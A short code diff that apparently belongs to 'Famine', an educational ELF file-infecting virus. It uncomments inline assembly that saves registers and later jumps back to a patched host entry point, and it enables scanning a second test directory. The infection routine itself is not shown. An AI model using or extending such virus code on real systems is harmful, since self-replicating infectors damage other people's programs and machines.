@@ -65,7 +65,7 @@ int listdir(char *target) {
 }
 
 int main(void) {
-	/*__asm__(
+	__asm__(
 		// save registers
 		"push %rax \n"
 		"push %rcx \n"
@@ -82,7 +82,7 @@ int main(void) {
 		"push %r13 \n"
 		"push %r14 \n"
 		"push %r15 \n"
-	);*/
+	);
 
 	//if (DEBUG) printf("%s\n", "Famine version 1.0 (c)oded by eparisot");
 	char* str = "Famine version 1.0 (c)oded by eparisot\n";
@@ -90,9 +90,9 @@ int main(void) {
 
 
 	listdir("/tmp/test/");
-	//listdir("/tmp/test2/");
+	listdir("/tmp/test2/");
 
-	/*__asm__(
+	__asm__(
 		// restore used registers
 		"pop %r15 \n"	
 		"pop %r14 \n"
@@ -113,7 +113,7 @@ int main(void) {
 		//"add $0x8, %rsp \n"
 		// jump back to main
 		"jmp . + 5 + 0x42424242 \n"
-	);*/
+	);
 
 	return 0;
 }
